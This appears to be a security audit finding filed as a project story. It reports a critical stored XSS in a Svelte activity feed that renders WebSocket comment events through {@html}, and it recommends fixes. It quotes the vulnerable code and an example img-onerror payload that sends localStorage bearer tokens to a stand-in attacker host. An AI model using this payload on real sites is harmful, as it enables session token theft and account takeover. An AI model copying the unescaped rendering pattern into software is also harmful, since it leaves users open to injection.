---
id: gate-security-xss-html-render-ws-events
kind: story
stage: implementing
tags: [security, ui, portal]
parent: null
depends_on: []
release_binding: v0.1.0
gate_origin: security
created: 2026-05-18
updated: 2026-05-18
---

# Stored XSS via `{@html}` rendering of WebSocket event payloads

## Severity
Critical

## Domain
Input Validation & Injection

## Location
`frontend/src/lib/components/ActivityFeed.svelte:23-77`

## Evidence
```svelte
case 'comment.added':
  return {
    icon: '💬',
    html: `<span class="who">${p.author_id}</span> commented: ${p.body}`,
    isConflict: false,
  };
...
<span class="text">{@html fmt.html}</span>
```

Comment body originates from `CreateComment` (REST and MCP), stored verbatim
(`internal/portal/comments/service.go:151` — `Body: p.Body`), then broadcast
in `comment.added` events. Bearer tokens live in localStorage
(`frontend/src/lib/auth.svelte.ts:38-39`), so an XSS payload like
`<img src=x onerror="fetch('//evil/?'+localStorage.token)">` posted as a
comment body executes for every viewer of the session and exfiltrates their
access + refresh tokens.

## Remediation direction
Drop `{@html ...}` entirely and use Svelte's automatic text interpolation;
render emphasis/links with structured templating (`{#if} … {:else} …`)
rather than HTML strings. Apply across every branch of `formatEvent`
(commit subjects, ref names, author IDs, comment bodies all flow through
here). Consider moving access tokens out of localStorage to an httpOnly
cookie or memory-only storage as a defense-in-depth follow-up.
